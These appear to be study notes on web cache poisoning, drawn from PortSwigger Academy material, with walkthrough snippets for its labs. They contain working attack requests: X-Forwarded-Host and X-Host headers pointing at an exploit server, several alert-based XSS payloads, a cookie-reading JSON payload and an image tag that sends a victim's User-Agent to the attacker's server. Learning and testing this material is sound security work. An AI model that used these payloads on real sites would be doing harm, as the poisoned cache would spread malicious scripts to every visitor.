# Web cache poisoning

## **What is web cache poisoning?**

Web cache poisoning is an advanced technique whereby an attacker exploits the behavior of a web server and cache so that a harmful HTTP response is served to other users. 

### Cache keys

When the cache receives an HTTP request, it first has to determine whether there is a cached response that it can serve directly, or whether it has to forward the request for handling by the back-end server. Caches identify equivalent requests by comparing a predefined subset of the request's components, known collectively as the "cache key". Typically, this would contain the request line and `Host` header. Components of the request that are not included in the cache key are said to be "unkeyed".

If the cache key of an incoming request matches the key of a previous request, then the cache considers them to be equivalent. As a result, it will serve a copy of the cached response that was generated for the original request. This applies to all subsequent requests with the matching cache key, until the cached response expires. 

## Constructing a web cache poisoning attack

Generally speaking, constructing a basic web cache poisoning attack involves the following steps:

1. [Identify and evaluate unkeyed inputs](https://portswigger.net/web-security/web-cache-poisoning#identify-and-evaluate-unkeyed-inputs)
2. [Elicit a harmful response from the back-end server](https://portswigger.net/web-security/web-cache-poisoning#elicit-a-harmful-response-from-the-back-end-server)
3. [Get the response cached](https://portswigger.net/web-security/web-cache-poisoning#get-the-response-cached)

### **Identify and evaluate unkeyed inputs**

Any web cache poisoning attack relies on manipulation of unkeyed inputs, such as headers. Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. Therefore, the first step when constructing a web cache poisoning attack is identifying unkeyed inputs that are supported by the server.

You can identify unkeyed inputs manually by adding random inputs to requests and observing whether or not they have an effect on the response. This can be obvious, such as reflecting the input in the response directly, or triggering an entirely different response. However, sometimes the effects are more subtle and require a bit of detective work to figure out. You can use tools such as Burp Comparer to compare the response with and without the injected input, but this still involves a significant amount of manual effort.

#### Param Miner

Fortunately, you can automate the process of identifying unkeyed inputs by adding the [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension to Burp from the BApp store. To use Param Miner, you simply right-click on a request that you want to investigate and click "Guess headers". Param Miner then runs in the background, sending requests containing different inputs from its extensive, built-in list of headers

**Caution:** When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request.

### Elicit a harmful response from the back-end server

Once you have identified an unkeyed input, the next step is to evaluate exactly how the website processes it. Understanding this is essential to successfully eliciting a harmful response. If an input is reflected in the response from the server without being properly sanitized, or is used to dynamically generate other data, then this is a potential entry point for web cache poisoning. 

### **Get the response cached**

Manipulating inputs to elicit a harmful response is half the battle, but it doesn't achieve much unless you can cause the response to be cached, which can sometimes be tricky.

Whether or not a response gets cached can depend on all kinds of factors, such as the file extension, content type, route, status code, and response headers. You will probably need to devote some time to simply playing around with requests on different pages and studying how the cache behaves. Once you work out how to get a response cached that contains your malicious input, you are ready to deliver the exploit to potential victims.

## **Exploiting cache design flaws**

Websites are vulnerable to web cache poisoning if they handle unkeyed input in an unsafe way and allow the subsequent HTTP responses to be cached. This vulnerability can be used as a delivery method for a variety of different attacks. 

### **Using web cache poisoning to deliver an XSS attack**

Perhaps the simplest web cache poisoning vulnerability to exploit is when unkeyed input is reflected in a cacheable response without proper sanitization.

For example, consider the following request and response:

```
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: innocent-website.co.uk

HTTP/1.1 200 OK
Cache-Control: public
<meta property="og:image" content="https://innocent-website.co.uk/cms/social.png" />
```

Here, the value of the `X-Forwarded-Host` header is being used to dynamically generate an Open Graph image URL, which is then reflected in the response, leading to the XSS attack.

### **Using web cache poisoning to exploit unsafe handling of resource imports**

Some websites use unkeyed headers to dynamically generate URLs for importing resources, such as externally hosted JavaScript files. In this case, if an attacker changes the value of the appropriate header to a domain that they control, they could potentially manipulate the URL to point to their own malicious JavaScript file instead. 

If the response containing this malicious URL is cached, the attacker's JavaScript file would be imported and executed in the browser session of any user whose request has a matching cache key. 

```
GET / HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: evil-user.net
User-Agent: Mozilla/5.0 Firefox/57.0

HTTP/1.1 200 OK
<script src="https://evil-user.net/static/analytics.js"></script>
```

### **Using web cache poisoning to exploit cookie-handling vulnerabilities**

Cookies are often used to dynamically generate content in a response. A common example might be a cookie that indicates the user's preferred language, which is then used to load the corresponding version of the page: 

```
GET /blog/post.php?mobile=1 HTTP/1.1
Host: innocent-website.com
User-Agent: Mozilla/5.0 Firefox/57.0
Cookie: language=pl;
Connection: close
```

In this example, the Polish version of a blog post is being requested. Notice that the information about which language version to serve is only contained in the `Cookie` header. Let's suppose that the cache key contains the request line and the `Host` header, but not the `Cookie` header.  In this case, if the response to this request is cached, then all subsequent users who tried to access this blog post would receive the Polish version as well, regardless of which language they actually selected.

        

### **Using multiple headers to exploit web cache poisoning vulnerabilities**

Some cache poisoning vulnerabilities require more sophisticated attacks and only become vulnerable when an attacker is able to craft a request that manipulates multiple unkeyed inputs. 

For example, let's say a website requires secure communication using HTTPS. To enforce this, if a request that uses another protocol is received, the website dynamically generates a redirect to itself that does use HTTPS:

```
GET /random HTTP/1.1
Host: innocent-site.com
X-Forwarded-Proto: http

HTTP/1.1 301 moved permanently
Location: https://innocent-site.com/random
```

By itself, this behavior isn't necessarily vulnerable. However, by combining this with what we learned earlier about vulnerabilities in dynamically generated URLs, an attacker could potentially exploit this behavior to generate a cacheable response that redirects users to a malicious URL. 

### **Exploiting responses that expose too much information**

Sometimes websites make themselves more vulnerable to web cache poisoning by giving away too much information about themselves and their behavior. 

#### **Vary header**

The rudimentary way that the `Vary` header is often used can also provide attackers with a helping hand. The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the `User-Agent` header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.

This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the `User-Agent` header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected. Alternatively, they could work out which user agent was most commonly used to access the site, and tailor the attack to affect the maximum number of users that way.

### **Using web cache poisoning to exploit DOM-based vulnerabilities**

Many websites use JavaScript to fetch and process additional data from the back-end. If a script handles data from the server in an unsafe way, this can potentially lead to all kinds of DOM-based vulnerabilities. 

For example, an attacker could poison the cache with a response that imports a JSON file containing the following payload: 

```json
{"someProperty" : "<svg onload=alert(1)>"}
```

If the website then passes the value of this property into a sink that supports dynamic code execution, the payload would be executed in the context of the victim's browser session. 

If you use web cache poisoning to make a website load malicious JSON data from your server, you may need to grant the website access to the JSON using CORS:

```json
HTTP/1.1 200 OK
Content-Type: application/json
Access-Control-Allow-Origin: *

{
    "malicious json" : "malicious json"
}
```

## **Exploiting cache implementation / cache key  flaws**

### **Cache probing methodology**

The methodology of probing for cache implementation flaws differs slightly from the classic web cache poisoning methodology. These newer techniques rely on flaws in the specific implementation and configuration of the cache, which may vary dramatically from site to site. This means that you need a deeper understanding of the target cache and its behavior. 

The methodology involves the following steps:

- [Identify a suitable cache oracle](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#identify-a-suitable-cache-oracle)
- [Probe key handling](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#probe-key-handling)
- [Identify an exploitable gadget](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws#identify-an-exploitable-gadget)

### **Unkeyed port**

The `Host` header is often part of the cache key and, as such, initially seems an unlikely candidate for injecting any kind of payload. However, some caching systems will parse the header and exclude the port from the cache key.

In this case, you can potentially use this header for web cache poisoning. For example, consider the case where a redirect URL was dynamically generated based on the `Host` 
header. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired.
        

### **Unkeyed query string**

Like the `Host` header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string.
        

#### **Detecting an unkeyed query string**

If you use Param Miner, you can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers". It will then automatically add a cache buster to commonly keyed headers in any requests that you send using Burp's manual testing tools. 

Another approach is to see whether there are any discrepancies between how the cache and the back-end normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit this to issue requests with different keys that still hit the same endpoint. For example, the following entries might all be cached separately but treated as equivalent to `GET /` on the back-end:

- Apache: `GET //`
- Nginx: `GET /%2F`
- PHP: `GET /index.php/xyz`
- .NET `GET /(A(xyz)/`

#### **Exploiting an unkeyed query string**

Excluding the query string from the cache key can actually make these reflected XSS vulnerabilities even more severe. 

Usually, such an attack would rely on inducing the victim to visit a maliciously crafted URL. However, poisoning the cache via an unkeyed query string would cause the payload to be served to users who visit what would otherwise be a perfectly normal URL.

### **Unkeyed query parameters**

Some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like `utm_content` are good candidates to check during testing.

Parameters that have been excluded from the cache key are unlikely to have a significant impact on the response. The chances are there won't be any useful gadgets that accept input from these parameters. That said, some pages handle the entire URL in a vulnerable manner, making it possible to exploit arbitrary parameters. 
        

### **Cache parameter cloaking**

Let's assume that the algorithm for excluding parameters from the cache key behaves in this way, but the server's algorithm only accepts the first `?` as a delimiter. Consider the following request: `GET /?example=123?excluded_param=bad-stuff-here`

In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second `?` as a delimiter and instead only sees one parameter, `example`, whose value is the entire rest of the query string, including our payload. If the value of `example` is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.

#### Exploiting parameter parsing quirks

Similar parameter cloaking issues can arise in the opposite scenario, where the back-end identifies distinct parameters that the cache does not. The Ruby on Rails framework, for example, interprets both ampersands (&) and semicolons (;) as delimiters. When used in conjunction with a cache that does not allow this, you can potentially exploit another quirk to override the value of a keyed parameter in the application logic. 

Consider the following request:

`GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here`

As the names suggest, `keyed_param` is included in the cache key, but `excluded_param` is not. Many caches will only interpret this as two parameters, delimited by the ampersand, But there is a duplicate `keyed_param`. This is where the second quirk comes into play. If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final 
occurrence. The end result is that the cache key contains an innocent, expected parameter value, allowing the cached response to be served as normal to other users. On the back-end, however, the same parameter has a completely different value, which is our injected payload. It is this second value that will be passed into the gadget and reflected in the poisoned response.
        

This exploit can be especially powerful if it gives you control over a function that will be executed. For example, if a website is using JSONP to make a cross-domain request, this will often contain a`callback` parameter to execute a given function on the returned data:

`GET /jsonp?callback=innocentFunction`

In this case, you could use these techniques to override the expected callback function and execute arbitrary JavaScript instead.

#### **Exploiting fat GET support**

In select cases, the HTTP method may not be keyed. This might allow you to poison the cache with a `POST` request containing a malicious payload in the body. Your payload would then even be served in response to users' `GET` requests. Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a `GET` request to create a "fat" `GET` request:

```
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```

In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body.

This is only possible if a website accepts `GET` requests that have a body, but there are potential workarounds. You can sometimes encourage "fat `GET`" handling by overriding the HTTP method, for example:

```
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

As long as the `X-HTTP-Method-Override` header is unkeyed, you could submit a pseudo-`POST` request while preserving a `GET` cache key derived from the request line.

#### **Exploiting dynamic content in resource imports**

Imported resource files are typically static but some reflect input from the query string. This is mostly considered harmless because browsers rarely execute these files when viewed directly, and an attacker has no control over the URLs used to load a page's subresources. However, by combining this with web cache poisoning, you can occasionally inject content into the resource file. 

For example, consider a page that reflects the current query string in an import statement:

```
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```

You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import `/style.css`.

### **Normalized cache keys**

when you find reflected XSS in a parameter, it is often unexploitable in practice. This is because modern browsers typically URL-encode the necessary characters when sending the request, and the server doesn't decode them. The response that the intended victim receives will merely contain a harmless URL-encoded string

Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key: 

```
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```

This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities. If you send a malicious request using Burp Repeater, you can poison the cache with an unencoded XSS payload. When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload. 

As a result, the cache will serve the poisoned response and the payload will be executed client-side

**Materials:**

[Practical Web Cache Poisoning](https://portswigger.net/research/practical-web-cache-poisoning)

[Web Cache Entanglement: Novel Pathways to Poisoning](https://portswigger.net/research/web-cache-entanglement)

## Labs

### **Exploiting cache design flaws**

[**Web cache poisoning with an unkeyed header**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

```markdown
# Unkeyed X-Forwarded-For header has been used to dynamically generate an URL   for importing a JavaScript file, which is reflected in the response, leading to XSS attack.
X-Forwarded-Host: exploit-server.net/exploit.js#
```

[**Web cache poisoning with an unkeyed cookie**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)

```markdown
# Unkeyed "fehost=prod-cache-01" cookie header is reflected in the response
Cookie: session=token; fehost=prod-cache-01"-alert(1)-"doc
OR
Cookie: session=token; fehost=prod-cache-01"}%3balert(1)%3b//
```

[**Web cache poisoning with multiple headers**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)

```markdown
# Request the JavaScript file /resources/js/tracking.js and send it to Repeater.
# Add the following headers, which redirect to the exploit server
GET /resources/js/tracking.js HTTP/2
Host: ID.web-security-academy.net
X-Forwarded-Host: exploit-ID.exploit-server.net
X-Forwarded-Scheme: http
# After cache is stored, Web application uses exploit server's tracking.js file instead of it's own one.
```

[**Targeted web cache poisoning using an unknown header**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-targeted-using-an-unknown-header)

```markdown
# Notice that the Vary header is used to specify that the User-Agent is part of the cache key
# Notice that the comment feature allows certain HTML tags. Post a comment      containing a following payload to get Victim's User-Agent header
<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />
# Param Miner will report that there is a secret input in the form of the       X-Host header, which has been used to dynamically generate an URL for importing a JavaScript file
GET / HTTP/1.1
Host: ID.web-security-academy.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
X-Host: exploit-ID.exploit-server.net/exploit.js#

```

[**Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-to-exploit-a-dom-vulnerability-via-a-cache-with-strict-cacheability-criteria)

```markdown
# Notice that X-Forwarded-Host header overwrites the data.host variable, which  is passed into the initGeoLocate() function. 
# Study the initGeoLocate() function in /resources/js/geolocate.js and notice   that it is vulnerable to DOM-XSS due to the way it handles the incoming JSON    data
# On the exploit server, add the following headers to enable CORS
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Access-Control-Allow-Origin: *
# In the body, add a malicious JSON 
{
    "country": "<img src=x onerror=alert(document.cookie)>"
}
# In Burp Repeater, add the following header and Send the request until you see your exploit server URL reflected in the response and X-Cache: hit in the       headers. 
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

[**Combining web cache poisoning vulnerabilities**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-combining-vulnerabilities)

### **Exploiting cache implementation / cache keys flaws**

[**Web cache poisoning via an unkeyed query string**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

```markdown
# Query string isn't included in the cache key
# Add dynamic cache buster via Param Miner -> Settings
# Notice that query string is reflected in the response, leading to XSS attack.
GET /?'/><img+src=1+onerror=alert(1)>
```

[**Web cache poisoning via an unkeyed query parameter**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)

```markdown
# Run Param Miner -> Guess Query Params
# utm_content parameter isn't included in the cache key
# Notice that query parameter is reflected in the response, leading to XSS.
GET /?utm_content='/><img+src=x+onerror=alert(1)>
```

[**Parameter cloaking**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

```markdown
# Run Param Miner -> Guess Query Params
# utm_content parameter isn't included in the cache key
# Note /js/geolocate.js, executing the callback function
# Observe that if you add duplicate callback parameters, only the final one is  reflected in the response, but both are still keyed. However, if you append the second callback parameter to the utm_content parameter using a semicolon, it is excluded from the cache key and still overwrites the callback function in the response:
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
```

[**Web cache poisoning via a fat GET request**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

```markdown
# Note /js/geolocate.js, executing the callback function
# Notice that you can control the name of the function that is called in the    response by passing in a duplicate callback parameter via the request body. Alsonotice that the cache key is still derived from the original callback parameter in the request line: 
GET /js/geolocate.js?callback=setCountryCookie
…
callback=alert(1)
```

[**URL normalization**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)

```markdown
# Any non-existent path path, such as GET /random, is reflected in the response.
# Note that browser URL encode the payload but the cache keep origin source
# Add a suitable reflected XSS payload to the request line: 
GET /random</p><script>alert(1)</script><p>pwned
```

[**Cache key injection**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection)

[**Internal cache poisoning**](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-internal)